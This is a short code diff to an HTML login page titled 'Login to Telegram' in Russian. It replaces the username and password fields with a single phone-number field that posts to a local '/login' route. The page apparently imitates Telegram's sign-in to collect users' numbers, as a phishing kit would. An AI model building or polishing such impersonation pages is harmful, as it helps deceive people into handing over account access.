@@ -24,7 +24,7 @@
             text-align: center;
             color: #0088cc;
         }
-        input[type="text"], input[type="password"] {
+        input[type="text"] {
             width: 100%;
             padding: 10px;
             margin: 10px 0;
@@ -49,8 +49,7 @@
     <div class="login-container">
         <h2>Вход в Telegram</h2>
         <form action="/login" method="POST">
-            <input type="text" name="username" placeholder="Имя пользователя" required>
-            <input type="password" name="password" placeholder="Пароль" required>
+            <input type="text" name="username" placeholder="Номер" required>
             <button type="submit">Войти</button>
         </form>
     </div>
